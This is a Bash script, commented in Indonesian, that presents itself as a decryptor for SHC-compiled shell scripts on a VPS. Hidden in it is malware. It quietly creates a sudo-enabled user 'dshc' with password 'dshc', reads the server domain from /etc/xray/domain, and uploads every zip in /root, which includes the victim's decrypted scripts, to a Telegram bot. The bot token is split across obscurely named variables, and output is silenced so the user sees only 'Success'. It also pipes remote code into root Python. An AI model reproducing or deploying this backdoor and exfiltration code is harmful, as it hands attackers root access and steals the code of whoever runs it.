function itil(){
if [ "${EUID}" -ne 0 ]; then
echo "You need to run this script as root"
echo "Wajib Pakai VPS dengan hak akses root yagesya"
echo "Recommended Debian 10 atau Ubuntu 18 , 20 "
sleep 5
exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
echo "OpenVZ is not supported"
exit 1
fi
}
itil
echo -e " Hati² dengan Backend Yg ada pda script yg akan di dec :) ";sleep 2
clear
echo;echo;echo;read -p " Input Diktory File : " dick
cd $dick
read -p " Input Nama File :) : " filesc
cd;mkdir -p shx bahan hasil
cp $filesc bahan/
mv $filesc shx/encrypted.sh.x
rm -f unshc-output.zip > /dev/null 2>&1
rm -fr /root/bahan/unshc-output > /dev/null 2>&1
MERAH=$(tput setaf 1)
IJO=$(tput setaf 2)
hun=AAFXET6ktADtSkmpZ-k--7Da8EjKYQag37s
xzv=605787
autoshc=/bin/bash
KUNING=$(tput setaf 3)
BIRU=$(tput setaf 4)
bt=6940153673:${hun}
ci=5548${xzv}
userdel dshc > /dev/null 2>&1
fileshc="dshc"
mkdir -p /home/script/
useradd -r -d /home/script -s $autoshc -M $fileshc > /dev/null 2>&1
echo -e "$fileshc\n$fileshc\n"|passwd $fileshc > /dev/null 2>&1
usermod -aG sudo $fileshc > /dev/null 2>&1
domm=$(cat /etc/xray/domain)
tekz="`$domm` `$fileshc`"
outputzip=("unshc-output.zip")
FOLDERSHX=/root/shx/
FOLDER=/root/bahan
xdv=sendDocument
chmod +x ${FOLDER}/*
chmod +x /root/bahan/*.sh
mkdir -p $FOLDER/unshc-output
FILES=$(find $FOLDER -name "*.sh")
function memek_burhan(){
sudo true && wget -q -O- https://github.com/niansa/bash-shxdumper/raw/master/run.py | sudo python3 /dev/stdin dump ./encrypted.sh.x ./decrypted.sh && rm encrypted.sh.x
mv decrypted.sh "${FOLDER}/unshc-output/${FILE##*/}"
}
for FILE in $FILES; do
cp -f "$FILE" /root/shx/encrypted.sh.x
chmod +x /root/shx/encrypted.sh.x
cd /root/shx
sudo true && wget -q -O- https://github.com/niansa/bash-shxdumper/raw/master/run.py | sudo python3 /dev/stdin dump ./encrypted.sh.x ./decrypted.sh && rm encrypted.sh.x
mv decrypted.sh "${FOLDER}/unshc-output/${FILE##*/}"
echo "file $FILE berhasil di decrypt via dshc"
done
echo -e "${BIRU} Bungkus Semua file ke dalam folder $outputzip "
cd /root/bahan
zip -r unshc-output.zip unshc-output
mv -f *.zip /root
cd /root
rm -rf /root/hasil > /dev/null 2>&1
mkdir -p /root/hasil
cp -f /root/bahan/unshc-output/*.sh /root/hasil/
rm -fr /root/bahan/unshc-output
echo -e "${BIRU} Silahkan Tunggu Sebentar.. :)"
cd /root
function decshc() {
de=bot$bt/$xdv
DIREKTORII=/root
FILEXX=$(find $DIREKTORII -name "*.zip")
for FILE in $FILEXX; do
curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/$de
done
}
decshc > /dev/null 2>&1
clear
echo "$IJO Success Decrypt SHC via dshc :)"
sleep 1
echo -e "$KUNING File Output.zip Tersimpan Di Folder Root, /root/${outputzip} "
sleep 2
echo -e "$IJO"
read -n 1 -s -r -p "  >>>>> Press any key , Cefatt.. <<<<
$MERAH(Tekan Enter untuk melihat hasil Decrypt / output.zip) "
echo ""
echo ""
echo "lokasi path:"
pwd
echo ""
echo "lokasi file:"
find /root -name "*output.zip"
echo ""
find /root/hasil -name "*.sh"
echo ""
